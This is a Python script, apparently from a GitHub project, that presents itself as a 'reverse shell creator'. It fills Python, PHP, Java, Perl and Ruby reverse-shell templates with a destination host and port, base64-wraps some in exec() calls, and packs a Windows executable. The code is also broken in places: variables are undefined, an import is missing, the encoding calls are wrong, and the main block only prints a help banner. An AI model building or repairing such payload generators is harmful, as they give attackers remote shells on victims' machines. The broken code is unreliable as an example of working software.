#!/usr/bin/env python3
# --n3x7--
# sundaysec http://github.com/sundaysec

#########################################################################
 # DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE                         #
 #                    Version 2, December 2004                         #
 #                                                                     #
 # Copyright (C) 2018 Sunday Philemon philemonsunday202@gmail.com      #
 #                                                                     #
 # Everyone is permitted to copy and distribute verbatim or modified   #
 # copies of this license document, and changing it is allowed as long #
 # as the name is changed.                                             #
 #                                                                     #
 #            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE              #
 #   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION   #
 #                                                                     #
 #  0. You just DO WHAT THE FUCK YOU WANT TO                           #
#########################################################################

import argparse as arg
import os
import socket
import fcntl
import struct
import base64
import random
import fileinput
from shutil import copyfile

# -------------------------------
#Get ip --- Currently Not Needed:
# -------------------------------

# def interface_ip(ifname):
#     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#     return socket.inet_ntoa(fcntl.ioctl(
#         s.fileno(),
#         0x8915,  # SIOCGIFADDR
#         struct.pack('256s', ifname[:15])
#     )[20:24])
# default_ip = interface_ip('wlan0')

# ----------
#Arguements:
# ----------
parser = arg.ArgumentParser()
parser.add_argument("-t","--type", help="Payload type(Default: windows)", default="windows")
parser.add_argument("-d", "--dest", help="Destination Host (Leave Empty for bind shell)", default='')
# parser.add_argument("-i", "--interface", help="Interface to use(Not mandatory) ")
parser.add_argument("-p", "--port", help="The port to listen on", default=443)
parser.add_argument("-o", "--output", help="The output filename",default="output")

done=parser.parse_args()

def help():
    print("""
                         _____
     _ ____      ___ __ |___ / _ __
    | '_ \ \ /\ / / '_ \  |_ \| '__|
    | |_) \ V  V /| | | |___) | |
    | .__/ \_/\_/ |_| |_|____/|_|
    |_| reverse shell creator

    -h/--help : Display this help message
    -t/--type : Os type : Windows/Linux
    -d/--dest : Destination Ip
    -p/--port : Destination Port
    """)

class main:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.name = output

    def linpy(self):
        # --------------------------------------------
        # Creates python reverse shell file for linux:
        # --------------------------------------------
        copyfile("core/lin.py", "/temp/lin.py")
        with fileinput.FileInput("/temp/lin.py", inplace=True, backup='.bak') as file:
            # ---------------------------
            # Find and replace variables:
            # ---------------------------
            for line in file:
                print(line.replace(ipaddr, self.host))
                print(line.replace(port, self.port))
        with open('/temp/lin.py', 'r') as temp2:
            data=temp2.read().replace('\n', '')
            # -------------------
            # Encode the Payload:
            # -------------------
            encoded = base64.encode(data)
            # ------------------------------
            # Create and Write Final Output:
            # ------------------------------
            final = open('output/'+ self.name +'.py',"w")
            final.write("exec(" + encoded + ").decode('base64')")


    def winexe(self):
        # --------------------------------------------
        # Compiles python reverse shell into exe file:
        # --------------------------------------------
        copyfile("core/win.py", "/temp/win.py")
        with fileinput.FileInput("/temp/win.py", inplace=True, backup='.bak') as file:
            # ---------------------------
            # Find and replace variables:
            # --------------------------
            for line in file:
                print(line.replace(ipaddr, self.host))
                print(line.replace(port, self.port))
        with open('/temp/win.py', 'r') as temp2:
            data=temp2.read().replace('\n', '')
            encoded = base64.encode(data)
            final = open('output/'+self.name+'.py','w')
            final.write("exec(" + encoded + ").decode('base64')")
            # ---------------------------
            # Convert to exe for Windows:
            # ---------------------------
        subprocess.Popen("wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile output/final.py", shell=True).wait()

    def php(self):
        # --------------------------
        # Creates Php reverse shell:
        # --------------------------
        copyfile("core/php.php", 'output/'+self.name+'.php')
        with fileinput.FileInput('output/'+self.name+'.php', inplace=True, backup='.bak') as file:
            # ---------------------------
            # Find and replace variables:
            # --------------------------
            for line in file:
                print(line.replace(ipaddr, self.host))
                print(line.replace(port, self.port))

    def java(self):
        # --------------------------
        # Creates Java reverse shell:
        # --------------------------
        copyfile("core/java.java", 'output/'+self.name+'.java')
        with fileinput.FileInput('output/'+self.name+'.java', inplace=True, backup='.bak') as file:
            # ---------------------------
            # Find and replace variables:
            # --------------------------
            for line in file:
                print(line.replace(ipaddr, self.host))
                print(line.replace(port, self.port))

    def linux_perl(self):
        # ---------------------------------------
        # Creates Perl reverse shell for Linux:
        # ---------------------------------------
        copyfile("core/sh_perl.pl", 'output/'+self.name+'.pl')
        with fileinput.FileInput('output/'+self.name+'.pl', inplace=True, backup='.bak') as file:
            # ---------------------------
            # Find and replace variables:
            # --------------------------
            for line in file:
                print(line.replace(ipaddr, self.host))
                print(line.replace(port, self.port))

    def windows_perl(self):
        # ---------------------------------------
        # Creates Perl reverse shell for Windows:
        # ---------------------------------------
        copyfile("core/cmd_perl.pl", 'output/'+self.name+'.pl')
        with fileinput.FileInput('output/'+self.name+'.pl', inplace=True, backup='.bak') as file:
            # ---------------------------
            # Find and replace variables:
            # --------------------------
            for line in file:
                print(line.replace(ipaddr, self.host))
                print(line.replace(port, self.port))

    def ruby_shell(self):
        # ---------------------------------------
        # Creates Ruby reverse shell for Linux:
        # ---------------------------------------
        copyfile("core/ruby_sh.rb", 'output/'+self.name+'.rb')
        with fileinput.FileInput('output/'+self.name+'.rb', inplace=True, backup='.bak') as file:
            # ---------------------------
            # Find and replace variables:
            # --------------------------
            for line in file:
                print(line.replace(ipaddr, self.host))
                print(line.replace(port, self.port))

    def ruby_cmd(self):
        # ---------------------------------------
        # Creates Ruby reverse shell for Windows:
        # ---------------------------------------
        copyfile("core/ruby_cmd.rb", 'output/'+self.name+'.rb')
        with fileinput.FileInput('output/'+self.name+'.rb', inplace=True, backup='.bak') as file:
            # ---------------------------
            # Find and replace variables:
            # ---------------------------
            for line in file:
                print(line.replace(ipaddr, self.host))
                print(line.replace(port, self.port))

    @classmethod
    def output_name(cls):
        cls.name = done.output


    def cleanup():
        # ------------------
        #Currently not need:
        # ------------------
        pass

if __name__ == "__main__":
    help()
